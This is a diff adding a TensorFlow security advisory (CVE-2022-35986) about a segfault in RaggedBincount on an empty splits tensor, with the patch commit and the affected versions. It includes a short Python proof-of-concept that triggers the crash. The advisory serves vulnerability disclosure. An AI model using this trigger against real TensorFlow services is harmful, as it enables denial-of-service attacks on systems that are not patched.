@@ -1,0 +1,20 @@
+<h2>TFSA-2022-117: Segfault in <code>RaggedBincount</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35986</p>
+<h3>Impact</h3>
+<p>If <code>RaggedBincount</code> is given an empty input tensor <code>splits</code>, it results in a segfault that can be used to trigger a denial of service attack.
+<code>python
+import tensorflow as tf
+binary_output = True
+splits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)
+values = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
+size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
+weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
+tf.raw_ops.RaggedBincount(splits=splits, values=values, size=size, weights=weights, binary_output=binary_output)</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/7a4591fd4f065f4fa903593bc39b2f79530a74b8">7a4591fd4f065f4fa903593bc39b2f79530a74b8</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
